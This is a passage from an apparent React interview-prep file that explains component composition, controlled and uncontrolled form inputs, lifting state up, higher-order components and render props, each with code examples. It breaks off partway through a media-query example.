    <Dialog title="Confirm Action">
      <p>Are you sure?</p>
      <button onClick={onConfirm}>Yes</button>
      <button onClick={onCancel}>No</button>
    </Dialog>
  );
}

Real-world example: Modal composition
--------------------------------------

// Generic Modal
function Modal({ isOpen, onClose, children }) {
  if (!isOpen) return null;
  
  return (
    <div className="modal-backdrop" onClick={onClose}>
      <div className="modal-content" onClick={e => e.stopPropagation()}>
        {children}
      </div>
    </div>
  );
}

// Modal parts (composition)
function ModalHeader({ children, onClose }) {
  return (
    <div className="modal-header">
      {children}
      <button onClick={onClose} className="close-button">×</button>
    </div>
  );
}

function ModalBody({ children }) {
  return <div className="modal-body">{children}</div>;
}

function ModalFooter({ children }) {
  return <div className="modal-footer">{children}</div>;
}

// Compose to create specific modals
function DeleteConfirmModal({ isOpen, onClose, onConfirm, itemName }) {
  return (
    <Modal isOpen={isOpen} onClose={onClose}>
      <ModalHeader onClose={onClose}>
        <h2>Confirm Delete</h2>
      </ModalHeader>
      <ModalBody>
        <p>Are you sure you want to delete "{itemName}"?</p>
        <p>This action cannot be undone.</p>
      </ModalBody>
      <ModalFooter>
        <button onClick={onClose}>Cancel</button>
        <button onClick={onConfirm} className="btn-danger">Delete</button>
      </ModalFooter>
    </Modal>
  );
}

Composition over inheritance:
------------------------------

React doesn't use class inheritance for reuse. Use composition instead.

// ❌ Bad: Inheritance (not React way)
class BaseButton extends React.Component {
  render() {
    return <button onClick={this.props.onClick}>{this.props.children}</button>;
  }
}

class PrimaryButton extends BaseButton {
  render() {
    return <button className="btn-primary" onClick={this.props.onClick}>
      {this.props.children}
    </button>;
  }
}

// ✅ Good: Composition
function Button({ variant = 'default', onClick, children }) {
  const className = `btn btn-${variant}`;
  
  return (
    <button className={className} onClick={onClick}>
      {children}
    </button>
  );
}

function PrimaryButton({ onClick, children }) {
  return (
    <Button variant="primary" onClick={onClick}>
      {children}
    </Button>
  );
}

// Or even simpler:
<Button variant="primary">Click me</Button>

Flexible composition example: Form builder
-------------------------------------------

function Form({ onSubmit, children }) {
  return <form onSubmit={onSubmit}>{children}</form>;
}

function FormField({ label, children }) {
  return (
    <div className="form-field">
      <label>{label}</label>
      {children}
    </div>
  );
}

function TextInput({ value, onChange, ...props }) {
  return <input type="text" value={value} onChange={onChange} {...props} />;
}

function Select({ value, onChange, options }) {
  return (
    <select value={value} onChange={onChange}>
      {options.map(opt => (
        <option key={opt.value} value={opt.value}>
          {opt.label}
        </option>
      ))}
    </select>
  );
}

// Compose to create any form
function UserForm({ user, onChange }) {
  return (
    <Form onSubmit={handleSubmit}>
      <FormField label="Name">
        <TextInput
          value={user.name}
          onChange={e => onChange({ ...user, name: e.target.value })}
        />
      </FormField>
      
      <FormField label="Email">
        <TextInput
          type="email"
          value={user.email}
          onChange={e => onChange({ ...user, email: e.target.value })}
        />
      </FormField>
      
      <FormField label="Role">
        <Select
          value={user.role}
          onChange={e => onChange({ ...user, role: e.target.value })}
          options={[
            { value: 'admin', label: 'Admin' },
            { value: 'user', label: 'User' }
          ]}
        />
      </FormField>
      
      <button type="submit">Save</button>
    </Form>
  );
}

Summary:

Component composition:
- Build complex UIs from small, focused components
- Use children prop and named props for flexibility
- Prefer composition over inheritance
- Makes components reusable, testable, maintainable
- Core React pattern for building scalable apps
*/


/**
35. What is the difference between controlled and uncontrolled components?
--------------------------------------------------------------------------

Controlled and uncontrolled components refer to how form inputs manage their state.

Controlled Components:
----------------------

Form data is handled by React state. Component controls the input value.

Definition:
- React state is the "single source of truth"
- Input value is controlled by React
- Every state mutation has a handler function

Basic controlled input:

function ControlledInput() {
  const [value, setValue] = useState('');
  
  return (
    <input
      type="text"
      value={value} // ← Controlled by state
      onChange={e => setValue(e.target.value)} // ← Update state
    />
  );
}

How it works:
1. User types in input
2. onChange fires
3. Handler updates state
4. Component re-renders
5. Input displays new state value

Full controlled form example:

function ControlledForm() {
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    password: '',
    agreeToTerms: false
  });
  
  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    console.log('Form data:', formData);
    // formData always reflects current state
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        name="username"
        value={formData.username}
        onChange={handleChange}
      />
      
      <input
        name="email"
        type="email"
        value={formData.email}
        onChange={handleChange}
      />
      
      <input
        name="password"
        type="password"
        value={formData.password}
        onChange={handleChange}
      />
      
      <label>
        <input
          name="agreeToTerms"
          type="checkbox"
          checked={formData.agreeToTerms}
          onChange={handleChange}
        />
        I agree to terms
      </label>
      
      <button type="submit">Submit</button>
    </form>
  );
}

Benefits of controlled components:
- Full control over input value
- Easy to validate on every keystroke
- Can transform input (uppercase, formatting, etc.)
- Can disable/enable based on other fields
- Easy to debug (state is visible in DevTools)

Uncontrolled Components:
-------------------------

Form data is handled by the DOM itself. React doesn't control the value.

Definition:
- DOM is the "single source of truth"
- Input manages its own state
- Use refs to get values when needed

Basic uncontrolled input:

function UncontrolledInput() {
  const inputRef = useRef();
  
  const handleSubmit = () => {
    // Read value from DOM when needed
    console.log(inputRef.current.value);
  };
  
  return (
    <div>
      <input
        type="text"
        ref={inputRef} // ← Access DOM directly
        defaultValue="Initial value" // ← Not controlled by state
      />
      <button onClick={handleSubmit}>Submit</button>
    </div>
  );
}

Full uncontrolled form example:

function UncontrolledForm() {
  const usernameRef = useRef();
  const emailRef = useRef();
  const passwordRef = useRef();
  const agreeRef = useRef();
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Read values from DOM
    const formData = {
      username: usernameRef.current.value,
      email: emailRef.current.value,
      password: passwordRef.current.value,
      agreeToTerms: agreeRef.current.checked
    };
    
    console.log('Form data:', formData);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        ref={usernameRef}
        name="username"
        defaultValue=""
      />
      
      <input
        ref={emailRef}
        name="email"
        type="email"
        defaultValue=""
      />
      
      <input
        ref={passwordRef}
        name="password"
        type="password"
        defaultValue=""
      />
      
      <label>
        <input
          ref={agreeRef}
          name="agreeToTerms"
          type="checkbox"
          defaultChecked={false}
        />
        I agree to terms
      </label>
      
      <button type="submit">Submit</button>
    </form>
  );
}

Benefits of uncontrolled components:
- Less code (no state management)
- Simpler for simple forms
- Can integrate with non-React code
- Better for large forms (less re-renders)

Key differences:
----------------

Aspect              | Controlled               | Uncontrolled
--------------------|--------------------------|---------------------------
State location      | React state              | DOM
Value prop          | value={state}            | defaultValue={initial}
Get value           | Read from state          | Read from ref
Update value        | setState                 | ref.current.value =
Validation          | On every change          | On submit
Re-renders          | On every keystroke       | Only when form submits
Code complexity     | More                     | Less

Controlled example with validation:

function ControlledWithValidation() {
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');
  
  const handleChange = (e) => {
    const value = e.target.value;
    setEmail(value);
    
    // Validate on every change
    if (!value.includes('@')) {
      setError('Invalid email');
    } else {
      setError('');
    }
  };
  
  return (
    <div>
      <input
        type="email"
        value={email}
        onChange={handleChange}
      />
      {error && <span className="error">{error}</span>}
    </div>
  );
}

Uncontrolled with validation:

function UncontrolledWithValidation() {
  const emailRef = useRef();
  const [error, setError] = useState('');
  
  const handleSubmit = (e) => {
    e.preventDefault();
    const value = emailRef.current.value;
    
    // Validate on submit
    if (!value.includes('@')) {
      setError('Invalid email');
    } else {
      setError('');
      // Submit form
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input ref={emailRef} type="email" defaultValue="" />
      {error && <span className="error">{error}</span>}
      <button type="submit">Submit</button>
    </form>
  );
}

Transforming input (controlled only):

function FormattedInput() {
  const [value, setValue] = useState('');
  
  const handleChange = (e) => {
    // Force uppercase
    setValue(e.target.value.toUpperCase());
  };
  
  return (
    <input
      value={value}
      onChange={handleChange}
      placeholder="WILL BE UPPERCASE"
    />
  );
}

// Can't do this with uncontrolled components!

Hybrid approach (controlled with reset):

function HybridForm() {
  const [email, setEmail] = useState('');
  const formRef = useRef();
  
  const handleSubmit = (e) => {
    e.preventDefault();
    console.log({ email });
    
    // Reset using form.reset()
    formRef.current.reset();
    setEmail(''); // Also clear state
  };
  
  return (
    <form ref={formRef} onSubmit={handleSubmit}>
      <input
        type="email"
        value={email}
        onChange={e => setEmail(e.target.value)}
      />
      <button type="submit">Submit</button>
    </form>
  );
}

When to use controlled:
-----------------------

✅ Need instant validation
✅ Transform input (formatting, uppercase, etc.)
✅ Conditional disable/enable
✅ Dynamic default values
✅ Enforce input format
✅ Multi-step forms with state
✅ Form depends on other component state

Example - conditional fields:

function ConditionalForm() {
  const [userType, setUserType] = useState('guest');
  const [email, setEmail] = useState('');
  
  return (
    <form>
      <select value={userType} onChange={e => setUserType(e.target.value)}>
        <option value="guest">Guest</option>
        <option value="member">Member</option>
      </select>
      
      {userType === 'member' && (
        <input
          type="email"
          value={email}
          onChange={e => setEmail(e.target.value)}
          placeholder="Email required for members"
        />
      )}
    </form>
  );
}

When to use uncontrolled:
--------------------------

✅ Simple forms (contact, login)
✅ File inputs (always uncontrolled)
✅ Integrating with non-React libraries
✅ Performance critical (many inputs)
✅ Quick prototypes
✅ Don't need validation until submit

Example - file input (always uncontrolled):

function FileUpload() {
  const fileRef = useRef();
  
  const handleSubmit = (e) => {
    e.preventDefault();
    const file = fileRef.current.files[0];
    console.log('File:', file);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      {/* File inputs are ALWAYS uncontrolled * /}
      <input type="file" ref={fileRef} />
      <button type="submit">Upload</button>
    </form>
  );
}

Converting controlled to uncontrolled (and vice versa):

// Controlled
function Controlled() {
  const [value, setValue] = useState('');
  return <input value={value} onChange={e => setValue(e.target.value)} />;
}

// Same as uncontrolled
function Uncontrolled() {
  const ref = useRef();
  return <input ref={ref} defaultValue="" />;
}

// Hybrid - start uncontrolled, become controlled
function HybridInput() {
  const [isControlled, setIsControlled] = useState(false);
  const [value, setValue] = useState('');
  
  if (isControlled) {
    return <input value={value} onChange={e => setValue(e.target.value)} />;
  }
  
  return (
    <div>
      <input defaultValue="" />
      <button onClick={() => setIsControlled(true)}>
        Make Controlled
      </button>
    </div>
  );
}

Common mistakes:
----------------

Mistake 1: Mixing controlled and uncontrolled

// ❌ Bad: value AND defaultValue (React warning)
<input value={value} defaultValue="initial" onChange={onChange} />

// ✅ Good: Pick one
<input value={value} onChange={onChange} /> // Controlled
<input ref={ref} defaultValue="initial" /> // Uncontrolled

Mistake 2: value without onChange

// ❌ Bad: Read-only input (can't type)
<input value={value} />

// ✅ Good: Add onChange
<input value={value} onChange={e => setValue(e.target.value)} />

// Or make it explicitly read-only
<input value={value} readOnly />

Mistake 3: Switching between controlled and uncontrolled

// ❌ Bad: Starts uncontrolled (value is undefined)
const [value, setValue] = useState();
return <input value={value} onChange={e => setValue(e.target.value)} />;

// React warning: changing from uncontrolled to controlled

// ✅ Good: Initialize with string
const [value, setValue] = useState(''); // Empty string, not undefined

Summary:

Controlled:
- React state controls value
- Use value prop
- onChange updates state
- Full control, validation, transformation
- More code, more re-renders
- Recommended for most cases

Uncontrolled:
- DOM controls value
- Use defaultValue and ref
- Read value when needed
- Less code, simpler
- Good for simple forms, file inputs
- Less React-like, harder to validate
*/


/**
36. What is lifting state up?
-----------------------------

Lifting state up is the pattern of moving state from child components to their common 
parent, allowing multiple children to share and sync the same state.

Core principle:
When two or more components need to share state, move the state to their closest 
common ancestor.

Problem: Shared state between siblings
---------------------------------------

// ❌ Problem: Siblings can't share state directly

function TemperatureInput({ scale }) {
  const [temperature, setTemperature] = useState('');
  
  return (
    <div>
      <label>Temperature in {scale}:</label>
      <input
        value={temperature}
        onChange={e => setTemperature(e.target.value)}
      />
    </div>
  );
}

function Calculator() {
  return (
    <div>
      <TemperatureInput scale="Celsius" />
      <TemperatureInput scale="Fahrenheit" />
      {/* How do these sync? They can't! * /}
    </div>
  );
}

Solution: Lift state up
------------------------

// ✅ Solution: Lift state to common parent

function TemperatureInput({ scale, temperature, onTemperatureChange }) {
  return (
    <div>
      <label>Temperature in {scale}:</label>
      <input
        value={temperature}
        onChange={e => onTemperatureChange(e.target.value)}
      />
    </div>
  );
}

function Calculator() {
  const [temperature, setTemperature] = useState('');
  const [scale, setScale] = useState('c');
  
  const handleCelsiusChange = (temp) => {
    setScale('c');
    setTemperature(temp);
  };
  
  const handleFahrenheitChange = (temp) => {
    setScale('f');
    setTemperature(temp);
  };
  
  const celsius = scale === 'f' ? tryConvert(temperature, toC

elsius) : temperature;
  const fahrenheit = scale === 'c' ? tryConvert(temperature, toFahrenheit) : temperature;
  
  return (
    <div>
      <TemperatureInput
        scale="Celsius"
        temperature={celsius}
        onTemperatureChange={handleCelsiusChange}
      />
      <TemperatureInput
        scale="Fahrenheit"
        temperature={fahrenheit}
        onTemperatureChange={handleFahrenheitChange}
      />
      <BoilingVerdict celsius={parseFloat(celsius)} />
    </div>
  );
}

Real-world examples:
--------------------

Example 1: Shopping cart with quantity controls

// Before lifting (doesn't work):
function CartItem({ item }) {
  const [quantity, setQuantity] = useState(item.quantity);
  
  return (
    <div>
      {item.name}
      <button onClick={() => setQuantity(q => q - 1)}>-</button>
      {quantity}
      <button onClick={() => setQuantity(q => q + 1)}>+</button>
      {/* Total doesn't know about quantity changes! * /}
    </div>
  );
}

function Cart({ items }) {
  const total = items.reduce((sum, item) => sum + item.price * item.quantity, 0);
  return (
    <div>
      {items.map(item => <CartItem key={item.id} item={item} />)}
      <div>Total: ${total}</div>
    </div>
  );
}

// After lifting (works):
function CartItem({ item, quantity, onQuantityChange }) {
  return (
    <div>
      {item.name}
      <button onClick={() => onQuantityChange(item.id, quantity - 1)}>-</button>
      {quantity}
      <button onClick={() => onQuantityChange(item.id, quantity + 1)}>+</button>
    </div>
  );
}

function Cart() {
  const [items, setItems] = useState([
    { id: 1, name: 'Widget', price: 10, quantity: 1 },
    { id: 2, name: 'Gadget', price: 20, quantity: 2 }
  ]);
  
  const handleQuantityChange = (id, newQuantity) => {
    if (newQuantity < 1) return;
    
    setItems(prevItems =>
      prevItems.map(item =>
        item.id === id ? { ...item, quantity: newQuantity } : item
      )
    );
  };
  
  const total = items.reduce((sum, item) => sum + item.price * item.quantity, 0);
  
  return (
    <div>
      {items.map(item => (
        <CartItem
          key={item.id}
          item={item}
          quantity={item.quantity}
          onQuantityChange={handleQuantityChange}
        />
      ))}
      <div>Total: ${total}</div>
    </div>
  );
}

Example 2: Filter and list sync

// Before lifting:
function FilterBar() {
  const [filter, setFilter] = useState('');
  // ProductList doesn't know about filter!
  return <input value={filter} onChange={e => setFilter(e.target.value)} />;
}

function ProductList({ products }) {
  // Can't filter because filter state is in FilterBar!
  return products.map(p => <Product key={p.id} product={p} />);
}

// After lifting:
function FilterBar({ filter, onFilterChange }) {
  return (
    <input
      value={filter}
      onChange={e => onFilterChange(e.target.value)}
      placeholder="Filter products..."
    />
  );
}

function ProductList({ products, filter }) {
  const filtered = products.filter(p =>
    p.name.toLowerCase().includes(filter.toLowerCase())
  );
  
  return filtered.map(p => <Product key={p.id} product={p} />);
}

function ProductPage({ products }) {
  const [filter, setFilter] = useState('');
  
  return (
    <div>
      <FilterBar filter={filter} onFilterChange={setFilter} />
      <ProductList products={products} filter={filter} />
    </div>
  );
}

Example 3: Multi-step form

// State lifted to parent to track overall progress
function FormStep1({ data, onChange }) {
  return (
    <div>
      <input
        value={data.name}
        onChange={e => onChange({ ...data, name: e.target.value })}
      />
      <input
        value={data.email}
        onChange={e => onChange({ ...data, email: e.target.value })}
      />
    </div>
  );
}

function FormStep2({ data, onChange }) {
  return (
    <div>
      <input
        value={data.address}
        onChange={e => onChange({ ...data, address: e.target.value })}
      />
      <input
        value={data.city}
        onChange={e => onChange({ ...data, city: e.target.value })}
      />
    </div>
  );
}

function FormStep3({ data }) {
  return (
    <div>
      <h3>Review:</h3>
      <p>Name: {data.name}</p>
      <p>Email: {data.email}</p>
      <p>Address: {data.address}</p>
      <p>City: {data.city}</p>
    </div>
  );
}

function MultiStepForm() {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    address: '',
    city: ''
  });
  
  return (
    <div>
      {step === 1 && <FormStep1 data={formData} onChange={setFormData} />}
      {step === 2 && <FormStep2 data={formData} onChange={setFormData} />}
      {step === 3 && <FormStep3 data={formData} />}
      
      <div>
        {step > 1 && <button onClick={() => setStep(s => s - 1)}>Back</button>}
        {step < 3 && <button onClick={() => setStep(s => s + 1)}>Next</button>}
        {step === 3 && <button onClick={() => console.log(formData)}>Submit</button>}
      </div>
    </div>
  );
}

When to lift state up:
----------------------

✅ Multiple components need same data
✅ Components need to stay in sync
✅ Child components need to communicate
✅ Parent needs to aggregate child data
✅ Shared validation across components

When NOT to lift state up:
---------------------------

❌ State only used by one component (keep it local)
❌ Would require lifting through many levels (use Context instead)
❌ Independent component states (no sync needed)

Example - when NOT to lift:

// ❌ Bad: Lifting unnecessary state
function Parent() {
  const [isExpanded1, setIsExpanded1] = useState(false);
  const [isExpanded2, setIsExpanded2] = useState(false);
  
  return (
    <div>
      <Accordion isExpanded={isExpanded1} setIsExpanded={setIsExpanded1} />
      <Accordion isExpanded={isExpanded2} setIsExpanded={setIsExpanded2} />
    </div>
  );
}

// ✅ Good: Keep state local (they don't need to sync)
function Accordion() {
  const [isExpanded, setIsExpanded] = useState(false);
  
  return (
    <div>
      <button onClick={() => setIsExpanded(!isExpanded)}>Toggle</button>
      {isExpanded && <div>Content</div>}
    </div>
  );
}

Lifting state vs Context:
--------------------------

Lift state up when:
- Only a few components need state
- Components are close in tree (1-2 levels)
- Simple parent-child relationship

Use Context when:
- Many components need state
- Components are far apart in tree
- Deep prop drilling would occur

Example showing both:

// Lifting state (good for local scope)
function TodoSection() {
  const [todos, setTodos] = useState([]);
  
  return (
    <div>
      <TodoInput onAdd={todo => setTodos([...todos, todo])} />
      <TodoList todos={todos} onToggle={id => {/* ... * /}} />
      <TodoStats todos={todos} />
    </div>
  );
}

// Context (good for app-wide state)
const UserContext = createContext();

function App() {
  const [user, setUser] = useState(null);
  
  return (
    <UserContext.Provider value={{ user, setUser }}>
      <Header /> {/* Deep child needs user * /}
      <Sidebar /> {/* Deep child needs user * /}
      <Content /> {/* Deep child needs user * /}
    </UserContext.Provider>
  );
}

Best practices:
---------------

1. Lift to lowest common ancestor:

// ❌ Bad: Lift too high
function App() {
  const [modalOpen, setModalOpen] = useState(false);
  return (
    <div>
      <Header />
      <Main modalOpen={modalOpen} setModalOpen={setModalOpen} />
      <Footer />
    </div>
  );
}

// ✅ Good: Lift only as far as needed
function Main() {
  const [modalOpen, setModalOpen] = useState(false);
  return (
    <div>
      <Button onClick={() => setModalOpen(true)} />
      <Modal isOpen={modalOpen} onClose={() => setModalOpen(false)} />
    </div>
  );
}

2. Pass callbacks for updates:

// ✅ Good: Specific callbacks
function Parent() {
  const [count, setCount] = useState(0);
  
  const increment = () => setCount(c => c + 1);
  const decrement = () => setCount(c => c - 1);
  const reset = () => setCount(0);
  
  return <Child count={count} increment={increment} decrement={decrement} reset={reset} />;
}

3. Keep components reusable:

// ✅ Components don't know about parent structure
function TemperatureInput({ value, onChange, scale }) {
  return (
    <input
      value={value}
      onChange={e => onChange(e.target.value)}
      placeholder={`Temperature in ${scale}`}
    />
  );
}

Summary:

Lifting state up:
- Move state from children to common parent
- Allows siblings to share and sync state
- Parent controls state, children receive props
- Pass callbacks down for state updates
- Use when components need to communicate
- Don't lift too high (use Context for deep trees)
- Keep components reusable and generic
*/


/**
37. What are higher-order components (HOC)?
-------------------------------------------

A higher-order component (HOC) is a function that takes a component and returns a new 
component with additional props or behavior. It's a pattern for reusing component logic.

Syntax:

const EnhancedComponent = higherOrderComponent(WrappedComponent);

HOC is:
- A function (not a component)
- Takes a component as argument
- Returns a new enhanced component
- Doesn't modify original component

Basic example:
--------------

// HOC function
function withLogging(WrappedComponent) {
  return function EnhancedComponent(props) {
    useEffect(() => {
      console.log('Component mounted:', WrappedComponent.name);
      return () => console.log('Component unmounted:', WrappedComponent.name);
    }, []);
    
    return <WrappedComponent {...props} />;
  };
}

// Original component
function HelloWorld({ name }) {
  return <h1>Hello, {name}</h1>;
}

// Enhanced component
const HelloWorldWithLogging = withLogging(HelloWorld);

// Usage
<HelloWorldWithLogging name="Alice" />
// Logs: "Component mounted: HelloWorld"

Real-world HOC examples:
------------------------

Example 1: Authentication HOC

function withAuth(WrappedComponent) {
  return function AuthComponent(props) {
    const { user, loading } = useAuth(); // Custom hook
    
    if (loading) {
      return <div>Loading...</div>;
    }
    
    if (!user) {
      return <Navigate to="/login" />;
    }
    
    // User is authenticated, render component
    return <WrappedComponent {...props} user={user} />;
  };
}

// Protected component
function Dashboard() {
  return <div>Dashboard content</div>;
}

// Wrap with auth HOC
const ProtectedDashboard = withAuth(Dashboard);

// Usage
<Route path="/dashboard" element={<ProtectedDashboard />} />

Example 2: Data fetching HOC

function withDataFetching(WrappedComponent, url) {
  return function DataFetchingComponent(props) {
    const [data, setData] = useState(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);
    
    useEffect(() => {
      fetch(url)
        .then(res => res.json())
        .then(data => {
          setData(data);
          setLoading(false);
        })
        .catch(err => {
          setError(err);
          setLoading(false);
        });
    }, []);
    
    if (loading) return <div>Loading...</div>;
    if (error) return <div>Error: {error.message}</div>;
    
    return <WrappedComponent {...props} data={data} />;
  };
}

// Component that needs data
function UserList({ data }) {
  return (
    <ul>
      {data.map(user => <li key={user.id}>{user.name}</li>)}
    </ul>
  );
}

// Enhanced with data fetching
const UserListWithData = withDataFetching(UserList, '/api/users');

// Usage
<UserListWithData />

Example 3: Conditional rendering HOC

function withConditionalRender(WrappedComponent, condition) {
  return function ConditionalComponent(props) {
    if (!condition(props)) {
      return null;
    }
    
    return <WrappedComponent {...props} />;
  };
}

// Component
function AdminPanel() {
  return <div>Admin controls</div>;
}

// Only render if user is admin
const AdminPanelForAdmins = withConditionalRender(
  AdminPanel,
  (props) => props.user?.role === 'admin'
);

// Usage
<AdminPanelForAdmins user={currentUser} />

Example 4: Subscription HOC (like React Redux connect)

function withSubscription(WrappedComponent, selectData) {
  return function SubscriptionComponent(props) {
    const [data, setData] = useState(selectData(DataSource, props));
    
    useEffect(() => {
      const handleChange = () => {
        setData(selectData(DataSource, props));
      };
      
      DataSource.subscribe(handleChange);
      return () => DataSource.unsubscribe(handleChange);
    }, []);
    
    return <WrappedComponent data={data} {...props} />;
  };
}

// Usage
const CommentListWithSubscription = withSubscription(
  CommentList,
  (DataSource) => DataSource.getComments()
);

Example 5: Styling/theming HOC

function withTheme(WrappedComponent) {
  return function ThemedComponent(props) {
    const theme = useContext(ThemeContext);
    
    return <WrappedComponent {...props} theme={theme} />;
  };
}

// Component
function Button({ theme, children }) {
  return (
    <button style={{ background: theme.primaryColor }}>
      {children}
    </button>
  );
}

// Enhanced with theme
const ThemedButton = withTheme(Button);

Example 6: Props manipulation HOC

function withDefaultProps(WrappedComponent, defaultProps) {
  return function ComponentWithDefaults(props) {
    return <WrappedComponent {...defaultProps} {...props} />;
  };
}

// Component
function Greeting({ name, greeting }) {
  return <h1>{greeting}, {name}!</h1>;
}

// Add default greeting
const GreetingWithDefaults = withDefaultProps(Greeting, {
  greeting: 'Hello'
});

// Usage
<GreetingWithDefaults name="Alice" />
// Renders: "Hello, Alice!"

<GreetingWithDefaults name="Bob" greeting="Hi" />
// Renders: "Hi, Bob!"

Composing multiple HOCs:
-------------------------

// Multiple HOCs
const enhance = compose(
  withAuth,
  withLogging,
  withTheme
);

const EnhancedComponent = enhance(MyComponent);

// Or chain them
const EnhancedComponent = withAuth(withLogging(withTheme(MyComponent)));

Best practices:
---------------

1. Pass unrelated props through:

function withSomething(WrappedComponent) {
  return function Enhanced(props) {
    const { specialProp, ...passThroughProps } = props;
    
    const injectedProp = doSomethingWith(specialProp);
    
    // Pass through all other props
    return <WrappedComponent injectedProp={injectedProp} {...passThroughProps} />;
  };
}

2. Wrap display name for debugging:

function withSomething(WrappedComponent) {
  function Enhanced(props) {
    return <WrappedComponent {...props} />;
  }
  
  // Set display name for DevTools
  Enhanced.displayName = `withSomething(${getDisplayName(WrappedComponent)})`;
  
  return Enhanced;
}

function getDisplayName(WrappedComponent) {
  return WrappedComponent.displayName || WrappedComponent.name || 'Component';
}

3. Don't use HOCs inside render:

// ❌ Bad: Creates new component on every render
function Parent() {
  const EnhancedComponent = withAuth(MyComponent); // Don't do this!
  return <EnhancedComponent />;
}

// ✅ Good: Create enhanced component outside
const EnhancedComponent = withAuth(MyComponent);

function Parent() {
  return <EnhancedComponent />;
}

4. Copy static methods:

import hoistNonReactStatics from 'hoist-non-react-statics';

function withSomething(WrappedComponent) {
  function Enhanced(props) {
    return <WrappedComponent {...props} />;
  }
  
  // Copy static methods from wrapped component
  hoistNonReactStatics(Enhanced, WrappedComponent);
  
  return Enhanced;
}

Limitations of HOCs:
--------------------

1. Prop name collisions:

// If both HOCs inject a "data" prop, collision!
const enhanced = withData(withMoreData(Component));

2. Wrapper hell in DevTools:

<WithAuth>
  <WithTheme>
    <WithLogging>
      <WithData>
        <MyComponent />
      </WithData>
    </WithLogging>
  </WithTheme>
</WithAuth>

3. No static composition:

// Can't see what props are injected without running code
const Enhanced = withAuth(withTheme(Component));

HOCs vs Hooks:
--------------

HOCs (older pattern):

const EnhancedComponent = withAuth(Component);

Hooks (modern pattern):

function Component() {
  const user = useAuth(); // Cleaner!
  if (!user) return <Navigate to="/login" />;
  return <div>Content</div>;
}

Hooks advantages:
✅ No wrapper components
✅ Clearer where data comes from
✅ No prop naming collisions
✅ Easier to compose

When to still use HOCs:
- Working with class components (can't use hooks)
- Library patterns (like React Redux connect)
- When you need to wrap component tree

Modern alternative - custom hooks:

// Instead of HOC
function withWindowSize(Component) {
  return function(props) {
    const [size, setSize] = useState(getWindowSize());
    
    useEffect(() => {
      const handleResize = () => setSize(getWindowSize());
      window.addEventListener('resize', handleResize);
      return () => window.removeEventListener('resize', handleResize);
    }, []);
    
    return <Component {...props} windowSize={size} />;
  };
}

// Use custom hook instead
function useWindowSize() {
  const [size, setSize] = useState(getWindowSize());
  
  useEffect(() => {
    const handleResize = () => setSize(getWindowSize());
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);
  
  return size;
}

// Usage in component
function MyComponent() {
  const windowSize = useWindowSize(); // Much cleaner!
  return <div>Width: {windowSize.width}</div>;
}

Summary:

HOCs:
- Functions that take and return components
- Add behavior/props to components
- Enable code reuse across components
- Common before hooks (auth, data fetching, theming)
- Can be composed together
- Modern alternative: custom hooks (preferred)
- Still useful for class components and some libraries
*/


/**
38. What are render props?
--------------------------

Render props is a pattern where a component takes a function as a prop and calls it 
to render content, sharing logic while allowing flexibility in what gets rendered.

Core concept:
A component with a render prop takes a function that returns a React element and 
calls it instead of implementing its own render logic.

Basic example:
--------------

// Component with render prop
function Mouse({ render }) {
  const [position, setPosition] = useState({ x: 0, y: 0 });
  
  useEffect(() => {
    const handleMouseMove = (e) => {
      setPosition({ x: e.clientX, y: e.clientY });
    };
    
    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);
  
  // Call the render prop function with data
  return render(position);
}

// Usage
<Mouse render={({ x, y }) => (
  <h1>Mouse position: {x}, {y}</h1>
)} />

// Different usage
<Mouse render={({ x, y }) => (
  <div style={{ position: 'absolute', left: x, top: y }}>
    🐭
  </div>
)} />

The "children as function" pattern:
------------------------------------

// Instead of a "render" prop, use "children" prop as function
function Mouse({ children }) {
  const [position, setPosition] = useState({ x: 0, y: 0 });
  
  useEffect(() => {
    const handleMouseMove = (e) => {
      setPosition({ x: e.clientX, y: e.clientY });
    };
    
    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);
  
  return children(position);
}

// Usage
<Mouse>
  {({ x, y }) => (
    <h1>Mouse at {x}, {y}</h1>
  )}
</Mouse>

Real-world examples:
--------------------

Example 1: Data fetching with render prop

function DataFetcher({ url, render }) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  
  useEffect(() => {
    setLoading(true);
    fetch(url)
      .then(res => res.json())
      .then(data => {
        setData(data);
        setLoading(false);
      })
      .catch(err => {
        setError(err);
        setLoading(false);
      });
  }, [url]);
  
  return render({ data, loading, error });
}

// Usage
<DataFetcher
  url="/api/users"
  render={({ data, loading, error }) => {
    if (loading) return <div>Loading...</div>;
    if (error) return <div>Error: {error.message}</div>;
    return <UserList users={data} />;
  }}
/>

// Different rendering for same data
<DataFetcher
  url="/api/users"
  render={({ data, loading, error }) => {
    if (loading) return <Spinner />;
    if (error) return <ErrorPage error={error} />;
    return <UserGrid users={data} />;
  }}
/>

Example 2: Toggle component

function Toggle({ children }) {
  const [on, setOn] = useState(false);
  
  const toggle = () => setOn(prev => !prev);
  
  return children({ on, toggle });
}

// Usage - different UIs for same logic
<Toggle>
  {({ on, toggle }) => (
    <div>
      <button onClick={toggle}>
        {on ? 'ON' : 'OFF'}
      </button>
      {on && <div>Content is visible</div>}
    </div>
  )}
</Toggle>

<Toggle>
  {({ on, toggle }) => (
    <div>
      <Switch checked={on} onChange={toggle} />
      <Panel visible={on}>Panel content</Panel>
    </div>
  )}
</Toggle>

Example 3: Media query component

function MediaQuery({ query, children }) {
  const [matches, setMatches] = useState(
    () => window.matchMedia(query).matches
  );
  
  useEffect(() => {
    const mediaQuery = window.matchMedia(query);
    const handler = (e) => setMatches(e.matches);
    
    mediaQuery.addEventListener('change', handler);
    return () => mediaQuery.removeEventListener('change', handler);
  }, [query]);
  
